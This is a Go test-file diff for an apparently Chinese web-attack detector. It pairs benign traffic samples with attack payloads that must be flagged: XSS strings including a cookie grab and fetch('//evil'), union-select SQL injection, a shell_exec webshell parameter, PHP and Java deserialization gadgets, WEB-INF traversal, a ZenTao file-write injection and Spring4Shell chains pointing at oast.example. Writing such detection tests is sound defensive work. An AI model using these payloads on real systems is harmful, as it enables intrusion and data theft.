@@ -531,6 +531,80 @@ func TestCheckOWASP_BlazeFalsePositive_NewsTelemetryAdScript(t *testing.T) {
 	}
 }
 
+// TestCheckOWASP_StrictSuppressesNonExecutableXSSStructures 锁定「无执行语义」
+// 的结构型抑制在 strict / very_high 档位同样生效。
+//
+// 背景：strict 档位此前绕过了全部 XSS 误报抑制，导致真实业务流量被误判——
+// 分析类 JSON 里的 javascript:void(0)、新闻页的被动 iframe、图标 SVG、
+// JSX 演示代码都被计为攻击（线上 :3030 评测 22 条误报全部来自这些形态）。
+// 本组用例固定「任何档位都不应命中 XSS」的期望。
+func TestCheckOWASP_StrictSuppressesNonExecutableXSSStructures(t *testing.T) {
+	cases := []struct {
+		name  string
+		path  string
+		query string
+		body  []string
+	}{
+		{
+			name:  "analytics javascript void",
+			path:  "/analytics/v2_upload",
+			query: "appkey=0WEB0OEX9Y4SQ244",
+			body:  []string{`{"attributes":"{\"href\":\"javascript: void(0);\"}"}`},
+		},
+		{
+			name:  "bing ping javascript void",
+			path:  "/fd/ls/GLinkPingPost.aspx",
+			query: "IG=BD26&SERP=1&url=javascript%3Avoid(0)%3B",
+		},
+		{
+			name: "jsx inline handler",
+			path: "/cpe/process",
+			body: []string{`const App = () => (<a onClick={(e) => e.preventDefault()}><Space>Hover me</Space></a>);const { createRoot } = ReactDOM;createRoot(mountNode).render(<App />);`},
+		},
+		{
+			name: "passive iframe embed",
+			path: "/news/g",
+			body: []string{`<div><iframe id="iframeu6864722_1" name="iframeu6864722_1" src="https://pos.baidu.com/nclm" width="300" height="250"></iframe></div>`},
+		},
+		{
+			name: "passive svg icon",
+			path: "/logstores/prod/track",
+			body: []string{`{"icon":"<svg t=\"1682594285904\" class=\"icon\" viewBox=\"0 0 1024 1024\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M0 0\"/></svg>"}`},
+		},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			for _, sens := range []string{"strict", "very_high", "high", "mid"} {
+				hits := CheckOWASP(sens, tc.path, tc.query, nil, tc.body)
+				if hasCategory(hits, CatXSS) {
+					t.Fatalf("%s: %s 档不应命中 XSS，got %+v", tc.name, sens, hits)
+				}
+			}
+		})
+	}
+}
+
+// TestCheckOWASP_StrictStillDetectsExecutableXSS 锁定同一抑制逻辑不会放过
+// 具备执行语义的载荷：JSX 取值区、裸事件处理器赋值、伪协议调用与被动标签
+// 内的主动上下文都必须继续在 strict 档位命中。
+func TestCheckOWASP_StrictStillDetectsExecutableXSS(t *testing.T) {
+	cases := []string{
+		`<svg onload=alert(1)>`,
+		`<iframe src=javascript:alert(1)>`,
+		`<a onclick={alert(1)}>x</a>`,
+		`<div onclick={()=>fetch('//evil')}>x</div>`,
+		`<a onclick={()=>{location='//evil'}}>x</a>`,
+		`javascript:alert(document.cookie)`,
+		`<a onclick={(e)=>e.preventDefault()} onmouseover=alert(1)>x</a>`,
+	}
+	for _, payload := range cases {
+		hits := CheckOWASP("strict", "/", "", nil, []string{payload})
+		if !hasCategory(hits, CatXSS) {
+			t.Fatalf("strict 档应命中可执行载荷 %q，got %+v", payload, hits)
+		}
+	}
+}
+
 func TestCheckOWASP_BlazeFalsePositive_CTripJavaDeserializeMessage(t *testing.T) {
 	body := []string{"Cannot deserialize instance of java.util.ArrayList<java.lang.Integer> out of VALUE_STRING token; resource.c-ctrip.com load success"}
 	hits := CheckOWASP("high", "/bee/collect", "", map[string]string{"Content-Type": "application/json"}, body)
@@ -919,4 +993,202 @@ func hasRuleID(hits []OWASPHit, ruleID string) bool {
 		}
 	}
 	return false
+}
+
+// TestWebshell028BareShellExecLock 锁定 webshell:028 的「shell_exec 裸词」
+// 判据：参数名/参数值直接出现 shell_exec（一句话木马待拼接形态）必须命中，
+// 而含 shell_exec 子串的普通标识符（myshell_executor）不得误报。
+func TestWebshell028BareShellExecLock(t *testing.T) {
+	positives := []string{
+		"x=shell_exec",
+		"shell_exec",
+		"x=Shell_Exec&y=1",
+		"x=shell_exec($_GET[cmd])",
+	}
+	for _, q := range positives {
+		if hits := CheckOWASP("mid", "/forum.php", q, nil, nil); !hasCategory(hits, CatWebshell) {
+			t.Fatalf("shell_exec 裸词 %q 未触发 webshell 命中：%+v", q, hits)
+		}
+	}
+	negatives := []string{
+		"x=myshell_executor",
+		"name=shell_executor_v2",
+	}
+	for _, q := range negatives {
+		if hits := CheckOWASP("mid", "/forum.php", q, nil, nil); hasCategory(hits, CatWebshell) {
+			t.Fatalf("含 shell_exec 子串的正常标识符 %q 不应触发 webshell：%+v", q, hits)
+		}
+	}
+}
+
+// TestSQLi001UnionSelectFunctionCallLock 锁定 union select 后紧跟函数调用
+// （md5()/concat()/…）的注入形态必须命中 sqlq:001，不再被误报抑制器当作
+// 白样本抑制。该形态是全语料统计中「黑 95 / 白 0」的强信号。
+func TestSQLi001UnionSelectFunctionCallLock(t *testing.T) {
+	positives := []string{
+		"id=-1+union+select+md5(999999999)%23",
+		"id=103%20UNION%20ALL%20SELECT%20CONCAT%28md5(205420457)%29%23",
+		"id=1 union select database()",
+		"id=1 union select user()",
+	}
+	for _, q := range positives {
+		hits := CheckOWASP("mid", "/index.php", q, nil, nil)
+		if len(hits) == 0 {
+			t.Fatalf("union select 函数调用载荷 %q 未检出", q)
+		}
+	}
+	negatives := []string{
+		"m=Goods&a=showcate&id=103",
+		"id=1&name=union",
+		"q=select a from b",
+	}
+	for _, q := range negatives {
+		if hits := CheckOWASP("mid", "/index.php", q, nil, nil); len(hits) > 0 {
+			t.Fatalf("正常查询 %q 不应检出：%+v", q, hits)
+		}
+	}
+}
+
+// TestDeser018FnStreamGadgetLock 锁定 PHP 反序列化链的 Guzzle FnStream gadget：
+// Craft CMS CVE-2023-41892 一族的 JSON body 以 __class=GuzzleHttp\Psr7\FnStream
+// 触发对象注入。类名只出现在攻击载荷与库源码中，全语料黑 97 / 白 0。
+func TestDeser018FnStreamGadgetLock(t *testing.T) {
+	positives := []string{
+		`GuzzleHttp\Psr7\FnStream`,
+		`GuzzleHttp\\Psr7\\FnStream`,
+		`guzzlehttp\psr7\fnstream`,
+	}
+	for _, body := range positives {
+		if hits := CheckOWASP("mid", "/index.php", "", nil, []string{body}); len(hits) == 0 {
+			t.Fatalf("FnStream gadget %q 未检出", body)
+		}
+	}
+	negatives := []string{
+		`craft\behaviors\FieldLayoutBehavior`,
+		`GuzzleHttp\Psr7\Stream`,
+	}
+	for _, body := range negatives {
+		if hits := CheckOWASP("mid", "/index.php", "", nil, []string{body}); len(hits) > 0 {
+			t.Fatalf("非 gadget 目标 %q 不应检出：%+v", body, hits)
+		}
+	}
+}
+
+// TestDeser019ConstructMethodLock 锁定 ThinkPHP _method=__construct 过滤器注入：
+// 表单值恰为 __construct（PHP 魔术方法名），正常业务参数值不会使用。
+// 全语料黑 13 / 白 0。
+func TestDeser019ConstructMethodLock(t *testing.T) {
+	if hits := CheckOWASP("mid", "/index.php", "", nil, []string{"__construct"}); len(hits) == 0 {
+		t.Fatal("__construct 表单值未检出")
+	}
+	for _, v := range []string{"__construct()", "constructor", "construct"} {
+		if hits := CheckOWASP("mid", "/index.php", "", nil, []string{v}); len(hits) > 0 {
+			t.Fatalf("正常取值 %q 不应检出：%+v", v, hits)
+		}
+	}
+}
+
+// TestPathTrav020DotSegmentWebInfLock 锁定点段前缀绕过的 Java Web 配置访问：
+// /.//WEB-INF、./WEB-INF 用 /./ 或 .// 替代 ../ 规避上级目录规则。
+// 全语料黑 17 / 白 0。
+func TestPathTrav020DotSegmentWebInfLock(t *testing.T) {
+	positives := []string{
+		"/.//WEB-INF/classes/META-INF/microprofile-config.properties",
+		"/./WEB-INF/web.xml",
+		".//WEB-INF/web.xml",
+	}
+	for _, p := range positives {
+		if hits := CheckOWASP("mid", p, "", nil, nil); len(hits) == 0 {
+			t.Fatalf("点段前缀 WEB-INF 路径 %q 未检出", p)
+		}
+	}
+	for _, p := range []string{"/app/./webinf/x", "/static/WEB-INF-notes.html"} {
+		if hits := CheckOWASP("mid", p, "", nil, nil); len(hits) > 0 {
+			t.Fatalf("正常路径 %q 不应检出：%+v", p, hits)
+		}
+	}
+}
+
+// TestCmd041ScmWriteFileLock 锁定 SCM 客户端参数注入写 webshell：
+// ZenTao 的 SCM=Subversion&client=echo <串>// > ../../www/x.txt 利用链。
+// 该 target 不含分隔符与等号，依赖 hasCmdIndicator 的「> + ../ + 命令词」分支。
+// 全语料黑 16 / 白 0。
+func TestCmd041ScmWriteFileLock(t *testing.T) {
+	payload := `echo b115b3cbb909069ea10a84091d4069e7// > ../../www/igwehpwlgx.txt --`
+	if hits := CheckOWASP("mid", "/repo-edit-10000-10000.html", "", nil, []string{payload}); len(hits) == 0 {
+		t.Fatal("SCM 写文件载荷未检出")
+	}
+	for _, v := range []string{"Subversion", "SCM", "echo hello world", "../../www/index.html"} {
+		if hits := CheckOWASP("mid", "/repo-edit-10000-10000.html", "", nil, []string{v}); len(hits) > 0 {
+			t.Fatalf("正常取值 %q 不应检出：%+v", v, hits)
+		}
+	}
+}
+
+// TestEL015Spring4ShellClassLoaderLock 锁定 Spring4Shell（CVE-2022-22965）
+// 的 class.module.classLoader.resources 数据绑定链：
+//   - URL query 形态（configFile 外带请求）与 Tomcat AccessLogValve 写文件形态；
+//   - 请求体表单形态（同一属性链提交在 body 中）。
+//
+// 反例覆盖侦察阶段常见的空探针 `class.module.classLoader.DefaultAssertionStatus=`，
+// 该形态不含 resources 节点，不构成利用链，不应计入误报。
+// 全语料黑 46 / 白 0。
+func TestEL015Spring4ShellClassLoaderLock(t *testing.T) {
+	queryCases := []string{
+		"class.module.classLoader.resources.context.configFile=http://oast.example/x&class.module.classLoader.resources.context.configFile.content.a=xxx",
+		"class.module.classLoader.resources.context.parent.appBase=./&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+	}
+	for _, q := range queryCases {
+		if hits := CheckOWASP("mid", "/", q, nil, nil); len(hits) == 0 {
+			t.Fatalf("Spring4Shell query 载荷 %q 未检出", q)
+		}
+	}
+	body := "class.module.classLoader.resources.context.configFile=https://oast.example/y&class.module.classLoader.resources.context.configFile.content.aaa=xxx"
+	if hits := CheckOWASP("mid", "/", "", nil, []string{body}); len(hits) == 0 {
+		t.Fatalf("Spring4Shell 表单载荷 %q 未检出", body)
+	}
+	// class.classLoader.resources 等价形态（无 module 段）。
+	if hits := CheckOWASP("mid", "/", "class.classLoader.resources.context.configFile=http://oast.example/z", nil, nil); len(hits) == 0 {
+		t.Fatal("class.classLoader.resources 等价形态未检出")
+	}
+	for _, q := range []string{
+		"class.module.classLoader.DefaultAssertionStatus=",
+		"class.module.classLoader.DefaultAssertionStatus=xjm",
+		"class=com.example.Demo",
+		"classLoader=app",
+	} {
+		if hits := CheckOWASP("mid", "/", q, nil, nil); len(hits) > 0 {
+			t.Fatalf("非利用链取参 %q 不应检出：%+v", q, hits)
+		}
+	}
+}
+
+// TestDeser001JavaSerializationMagicLock 锁定 Java 原生序列化流头的字节级检测：
+// 归一化会剥离 NUL 字节（0xAC 0xED 0x00 0x05 → 0xAC 0xED 0x05），
+// deser:001 在归一化串上永远匹配不到，必须在原始目标上判定。
+// 覆盖 JBoss EJBInvokerServlet / JMXInvokerServlet / WebLogic 反序列化载荷。
+func TestDeser001JavaSerializationMagicLock(t *testing.T) {
+	// 真实载荷形态：流头 + HashMap + 反射 gadget 类名。
+	payload := "\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x00\x00\x00\x00\x00\x00\x01\x00\x00xq\x00~\x00\x01"
+	for _, sens := range []string{"mid", "strict"} {
+		hits := CheckOWASP(sens, "/probe", "", nil, []string{payload})
+		found := false
+		for _, h := range hits {
+			if h.RuleID == "owasp:deser:001" {
+				found = true
+			}
+		}
+		if !found {
+			t.Fatalf("sens=%s 下 Java 序列化流头未检出 deser:001：%+v", sens, hits)
+		}
+	}
+	// 反例：把流头里的 NUL 去掉后的纯文本形式不是序列化流。
+	for _, body := range []string{"aced05", "aced0005 is hex text", "sro11javautilHashMap"} {
+		hits := CheckOWASP("mid", "/probe", "", nil, []string{body})
+		for _, h := range hits {
+			if h.RuleID == "owasp:deser:001" {
+				t.Fatalf("非序列化流目标 %q 误命中 deser:001", body)
+			}
+		}
+	}
 }
